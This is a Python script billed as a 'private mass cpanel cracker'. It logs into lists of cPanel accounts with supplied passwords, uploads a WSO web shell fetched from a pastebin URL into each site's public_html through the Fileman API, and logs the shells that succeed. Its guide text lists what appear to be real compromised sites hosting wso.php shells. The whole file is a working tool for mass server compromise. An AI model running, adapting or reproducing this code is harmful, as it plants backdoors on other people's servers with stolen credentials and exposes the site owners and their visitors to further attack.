import requests, sys, os, re, random, urllib.request, urllib.error, urllib.parse, urllib.request, urllib.parse, urllib.error, http.client, socket, ssl, string, base64, zlib
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from platform import system
from colorama import *
init()
currentVersion = 'V1.3-2'
red = '\x1b[31m'
green = '\x1b[32m'
blue = '\x1b[34m'
yellow = '\x1b[33m'
white = '\x1b[37m'
combo = ''' 
                                                                                                      
                                                                                                      
    ,---,.            ,--,    ,--,                                          ___                       
  ,'  .'  \  ,--,   ,--.'|  ,--.'|                                        ,--.'|_                     
,---.' .' |,--.'|   |  | :  |  | :                     ,---,              |  | :,'   ,---.    __  ,-. 
|   |  |: ||  |,    :  : '  :  : '                 ,-+-. /  |             :  : ' :  '   ,'\ ,' ,'/ /| 
:   :  :  /`--'_    |  ' |  |  ' |     ,--.--.    ,--.'|'   |  ,--.--.  .;__,'  /  /   /   |'  | |' | 
:   |    ; ,' ,'|   '  | |  '  | |    /       \  |   |  ,"' | /       \ |  |   |  .   ; ,. :|  |   ,' 
|   :     \'  | |   |  | :  |  | :   .--.  .-. | |   | /  | |.--.  .-. |:__,'| :  '   | |: :'  :  /   
|   |   . ||  | :   '  : |__'  : |__  \__\/: . . |   | |  | | \__\/: . .  '  : |__'   | .; :|  | '    
'   :  '; |'  : |__ |  | '.'|  | '.'| ," .--.; | |   | |  |/  ," .--.; |  |  | '.'|   :    |;  : |    
|   |  | ; |  | '.'|;  :    ;  :    ;/  /  ,.  | |   | |--'  /  /  ,.  |  ;  :    ;\   \  / |  , ;    
|   :   /  ;  :    ;|  ,   /|  ,   /;  :   .'   \|   |/     ;  :   .'   \ |  ,   /  `----'   ---'     
|   | ,'   |  ,   /  ---`-'  ---`-' |  ,     .-./'---'      |  ,     .-./  ---`-'                     
`----'      ---`-'                   `--`---'                `--`---'                                 

A Private mass cpanel cracker by DavidBilla
https://t.me/sendgrid_aws_smtp 
'''
print(blue + combo + white)
choice = 8
try:
    os.mkdir('results')
except:
    pass

def guide():
    gd = '\nRules: must use wso shell this one --> https://pastebin.com/Ds35ij44\n\n\n1. Mass shell to anything uploader! \n\tPut shell list like this\n\t\thttp://toprose24.ru/wp-includes/js/tinymce/wso.php\n\t\thttp://nacso.org/wp-admin/shop/media/wso.php\n\t\thttp://www.systemawindsor.com/2014/wso.php\n\t\thttp://heights.co.kr/wp-includes/js/tinymce/wso.php\n\t\thttp://mybaguse.com/oldsite/wp-includes/wso.php\n\t\thttp://bdsharebazar.info/wp-includes/Core/wso.php\n\t\thttp://www.modsolar.net/wp-content/uploads/wso.php\n\t\thttp://theknittingneedle.in//wp-includes/css/wso.php\n\n\n\n'
    print(yellow + gd + white)


def tool8(url):
    try:
        filename = shellname + 'name.php'
        domain, username, pwd = url.split('|')
        dom = re.findall('https://(.*?):2083', domain)
        dom = dom[0]
        lib = requests.Session()
        host = domain + '/login/?login_only=1'
        log = {'user': username, 'pass': pwd}
        req = lib.post(host, data=log)
        if 'security_token' in req.content:
            apicp = re.findall('"redirect":"/(.*?)/frontend/', req.content)
            site = domain + '/' + apicp[0] + '/execute/Fileman/upload_files'
            path_up = {'dir': '/home/' + username + '/public_html/'}
            uploadfiles = {'file-': (filename, scriptmain)}
            req_uploader = lib.post(site, data=path_up, files=uploadfiles)
            checkfile = requests.get('http://' + dom + '/' + filename)
            if checkfile.status_code == 200:
                print(green + '[+] http://' + dom + '/' + filename + ' ==> Upload Success!' + white)
                os.chdir('results')
                open('success_upload_cPanel.txt', 'a').write('http://' + dom + '/' + filename + '\n')
                os.chdir('..')
            else:
                print(red + '[-] http://' + dom + '/' + filename + ' ==> Upload Failed!' + white)
        else:
            print(red + '[-] ' + domain + ' ==> Login invalid' + white)
    except:
        pass


if choice == 0:
    guide()
elif choice == 8:
    try:
        example = '[?] Enter cPanel like this -> https://sitee.me:2083|username|password'
        print(yellow + example + white)
        listshell = input(yellow + '[?] Enter cPanels list: ' + white)
        example = '[?] Enter script like this -> https://pastebin.com/raw/DZAXcMy7 or wso.php'
        print(yellow + example + white)
        scripturl = input(yellow + '[?] Enter link script: ' + white)
        shellname = input(yellow + '[?] Enter script name: ' + white)
        scriptmain = requests.get(scripturl).content
        try:
            with open(listshell, 'r') as (get):
                read = get.read().splitlines()
        except IOError:
            pass

        read = list(read)
        try:
            pp = ThreadPool(10)
            pr = pp.map(tool8, read)
        except:
            pass

    except:
        pass
